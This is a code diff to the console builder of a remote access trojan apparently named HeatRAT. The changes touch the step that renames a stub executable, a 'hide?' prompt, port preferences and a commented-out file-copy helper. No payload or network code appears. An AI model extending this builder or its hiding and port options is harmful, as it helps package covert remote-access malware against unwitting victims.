@@ -155,14 +155,6 @@ int main()
 }
 
 
-wstring ExePath() {
-	TCHAR buffer[MAX_PATH] = { 0 };
-	GetModuleFileName(NULL, buffer, MAX_PATH);
-	wstring::size_type pos = wstring(buffer).find_last_of(L"\\/");
-	return wstring(buffer).substr(0, pos);
-}
-
-
 void Help(string path) 
 {
 
@@ -192,11 +184,79 @@ void Help(string path)
 }
 
 
+//void fileCopy(string file, string source, string destination)
+//{
+//	for (int i = 0; i < source.size(); i++)
+//	{
+//		if (source[i] == '\\')
+//			source[i] = '/';
+//	}
+//	for (int i = 0; i < destination.size(); i++)
+//	{
+//		if (destination[i] == '\\')
+//			destination[i] == '/';
+//	}
+//	if (source[source.size() - 1] != '/')
+//		source.push_back('/');
+//	source = source + file;
+//	if (destination[destination.size() - 1] != '/')
+//		destination.push_back('/');
+//	destination = destination + file;
+//	ifstream sourceFile(source.c_str(), ios::binary);
+//	if (sourceFile)
+//	{
+//		ifstream idestination(destination.c_str());
+//		if (idestination)
+//		{
+//			cout << file << " already exist, Do you want to replace? [Yes/No] : ";
+//			string choice;
+//			getline(cin, choice);
+//			if (choice == "Y" || choice == "yes" || choice == "Yes" || choice == "YES" || choice == "y")
+//			{
+//				idestination.close();
+//				ofstream destinationFile(destination.c_str(), ios::binary);
+//				string line;
+//				while (getline(sourceFile, line))
+//				{
+//					destinationFile << line << endl;
+//				}
+//				destinationFile.flush();
+//				destinationFile.close();
+//				cout << endl << "File copied successfully" << endl;
+//			}
+//			else
+//			{
+//				cout << "Exiting...........";
+//				idestination.close();
+//			}
+//		}
+//		else
+//		{
+//			idestination.close();
+//			ofstream destinationFile(destination.c_str(), ios::binary);
+//			string line;
+//			while (getline(sourceFile, line))
+//			{
+//				destinationFile << line << endl;
+//			}
+//			destinationFile.flush();
+//			destinationFile.close();
+//			cout << endl << "File copied successfully" << endl;
+//		}
+//		sourceFile.close();
+//	}
+//	else
+//	{
+//		cout << endl << "[ERROR]:-" << endl;
+//		cout << "Not able to locate " << source << endl;
+//	}
+//}
+
 void Build()
 {
 	string ports = "Modules\\Preferences\\ports.txt";
 	bool openPort = false;
-	char stub[] = "Modules\\stub\\Stub.exe";
+	char stub[] = "Modules/stub/Stub.exe";
 
 	cout << "\n\n";
 
@@ -251,12 +311,6 @@ void Build()
 		cin >> something;
 		col = 8;
 		SetConsoleTextAttribute(hConsole, col);
-		printf(".exe name: ");
-		col = 11;
-		SetConsoleTextAttribute(hConsole, col);
-		cin >> something;
-		col = 8;
-		SetConsoleTextAttribute(hConsole, col);
 		printf("hide? (y/n) ");
 		col = 11;
 		SetConsoleTextAttribute(hConsole, col);
@@ -280,26 +334,27 @@ void Build()
 			Sleep(100);
 		}
 		printf("]\n\n");
-		printf("fixing...\n");
-		printf("[");
-		for (int i = 0; i <= 60; i++)
-		{
-			printf("=");
-			Sleep(500);
-		}
-		printf("]\n\n");
-
-		if (rename(stub, NULL) != 0) {
-			col = 4;
-			SetConsoleTextAttribute(hConsole, col);
-			printf("can't fix ERROR ==> 658\n");
-		}
-		else 
+		//fileCopy("Stub.exe","Modules/stub","ee");
+		int result;
+		char newname[] = "builded/HeatRAT.exe";
+		result = rename(stub, newname);
+		if (result == 0) 
 		{
 			col = 2;
 			SetConsoleTextAttribute(hConsole, col);
 			printf("done!!!\n");
+			col = 11;
+			SetConsoleTextAttribute(hConsole, col);
 		}
+		else 
+		{
+			col = 4;
+			SetConsoleTextAttribute(hConsole, col);
+			printf("ERROR ==> 495");
+			col = 11;
+			SetConsoleTextAttribute(hConsole, col);
+		}
+
 
 
 	}
@@ -715,7 +770,6 @@ void Ports(string logo)
 			file.close();
 			line = "";
 			curentPorts.pop_back();
-			ofstream newfile;       
 			ofstream newfile;       
 			newfile.open(prefrences); 
 			if (newfile.is_open())
